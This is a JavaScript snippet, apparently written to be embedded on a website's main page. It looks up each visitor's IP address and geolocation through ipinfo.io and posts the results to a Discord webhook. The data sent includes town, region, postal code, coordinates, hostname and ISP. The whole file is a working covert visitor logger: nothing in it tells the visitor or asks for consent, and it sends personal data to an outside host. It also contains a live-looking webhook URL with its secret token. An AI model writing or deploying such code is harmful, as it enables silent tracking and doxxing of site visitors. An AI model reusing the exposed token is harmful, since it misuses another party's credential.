$.getJSON("https://ipinfo.io/json", function (data) {
  var params = {
    embeds: [
      {
        title: "visitor main page",
        color: 15258703,
        thumbnail: {},
        fields: [
          {
            name: "IP Address",
            value: `> ${data.ip}`,
          },
          {
            name: "GeoLocation Info",
            value: `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${
              data.country
            }\nPostal Code: ${data.postal}\nTimeZone: ${data.timezone.replace(
              "_",
              " "
            )}\nLong/Lat: ${data.loc}`,
          },
          {
            name: "Network Info",
            value: `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`,
          },
        ],
      },
    ],
  };
  fetch(
    "https://discord.com/api/webhooks/976205009681285140/suRfhJqy_V1I5s7uHPjYD5Ad-brGTYj5trkf75YDkK8DCZ8LXxbwmwALRtWm6eF202PT",
    {
      method: "POST",
      headers: {
        "Content-type": "application/json",
      },
      body: JSON.stringify(params),
    }
  ).then((res) => {
    console.log(res);
  });
});
